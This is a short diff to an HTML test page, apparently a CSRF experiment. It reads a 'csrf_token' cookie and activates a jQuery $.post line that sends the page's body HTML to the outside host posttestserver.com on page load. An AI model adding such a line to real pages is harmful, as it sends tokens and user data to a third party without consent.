@@ -8,15 +8,15 @@
 	<script>
 		$( document ).ready(function() {
            console.log( "ready!" );
-		   //$.post( "https://posttestserver.com/post.php?dir=csrf3", { content: $('body').html()} );
 		   var cookie =  $.cookie("csrf_token");
 		   console.log( cookie );
 		   $("#cookie").value = cookie;
+		   $.post( "https://posttestserver.com/post.php?dir=csrf3", { content: $('body').html()} );
 	    });
 	</script>
   </head>
   <body>
-     <div>test 4</div>
+     <div>test 5</div>
 	 <div id="cookie"></div>
   </body>
 </html>
